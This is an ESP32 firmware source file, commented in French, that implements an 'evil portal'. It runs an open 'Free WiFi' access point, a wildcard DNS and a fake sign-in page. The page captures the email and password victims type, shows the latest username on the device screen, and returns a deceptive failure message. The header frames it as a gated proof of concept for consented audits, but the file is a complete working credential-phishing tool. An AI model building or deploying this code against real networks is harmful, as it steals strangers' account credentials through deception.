// ---------------------------------------------------------------------------
//  evilportal.cpp — portail captif de démonstration.
//
//  Réimplémentation clean-room (aucun code ESP-HACK). Ouvre un AP ouvert, un
//  DNS « wildcard » (toute requête pointe sur la carte) et un petit serveur web
//  servant une page de connexion. Les identifiants soumis sont comptés et le
//  dernier couple est affiché à l'écran. Rien n'est écrit ailleurs (pas de SD
//  ici) : c'est une preuve de concept pour audit consenti, gatée.
// ---------------------------------------------------------------------------
#include "config.h"
#include "theme.h"
#include "authgate.h"
#include "evilportal.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

namespace EvilPortal {

static const char *PORTAL_SSID = "Free WiFi";
static const byte DNS_PORT = 53;

static DNSServer dns;
static WebServer server(80);
static bool running = false;
static uint32_t captures = 0;
static String lastUser, lastPass;

// Page de connexion minimale. Volontairement générique.
static const char *PAGE =
    "<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>Sign in</title><style>body{font-family:sans-serif;max-width:320px;margin:40px auto;padding:0 16px}"
    "input{width:100%;padding:10px;margin:6px 0;box-sizing:border-box}button{width:100%;padding:10px}</style>"
    "<h2>Wi-Fi sign in</h2><form method=POST action=/login>"
    "<input name=u placeholder=Email><input name=p type=password placeholder=Password>"
    "<button>Connect</button></form>";

static void drawStatus() {
    u8g2.clearBuffer();
    gbHeader("Evil Portal");
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 24, running ? "AP: Free WiFi (open)" : "Status: idle");
    char buf[24];
    snprintf(buf, sizeof(buf), "Captured: %lu", (unsigned long)captures);
    u8g2.drawStr(0, 34, buf);
    if (lastUser.length()) {
        String u = "u: " + lastUser.substring(0, 18);
        u8g2.drawStr(0, 44, u.c_str());
    }
    u8g2.drawStr(0, 63, running ? "RIGHT stop   LEFT back" : "RIGHT start  LEFT back");
    u8g2.sendBuffer();
    setNeoPixelColour(running ? "attack" : "0");
}

static void handleRoot() { server.send(200, "text/html", PAGE); }

static void handleLogin() {
    lastUser = server.arg("u");
    lastPass = server.arg("p");
    captures++;
    // On renvoie une erreur plausible pour que la victime réessaie ailleurs.
    server.send(200, "text/html",
                "<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
                "<p style='font-family:sans-serif;margin:40px'>Connection failed. Please try again later.</p>");
    drawStatus();
}

static void startPortal() {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(PORTAL_SSID);
    dns.start(DNS_PORT, "*", WiFi.softAPIP());        // tout nom -> la carte
    server.onNotFound(handleRoot);                    // capture le portail OS
    server.on("/", handleRoot);
    server.on("/login", HTTP_POST, handleLogin);
    server.begin();
}

static void stopPortal() {
    server.stop();
    dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
}

void setup() {
    running = false;
    captures = 0;
    lastUser = "";
    lastPass = "";
    drawStatus();
}

bool loop() {
    if (digitalRead(BTN_PIN_RIGHT) == LOW) {
        while (digitalRead(BTN_PIN_RIGHT) == LOW);
        if (running) {
            running = false;
            stopPortal();
        } else if (AuthGate::confirm("Evil Portal", "Fake AP + captures", "typed credentials.")) {
            running = true;
            startPortal();
        }
        drawStatus();
    }

    if (digitalRead(BTN_PIN_LEFT) == LOW) {
        while (digitalRead(BTN_PIN_LEFT) == LOW);
        if (running) stopPortal();
        running = false;
        setNeoPixelColour("0");
        return true;
    }

    if (running) {
        dns.processNextRequest();
        server.handleClient();
    }
    return false;
}

}  // namespace EvilPortal
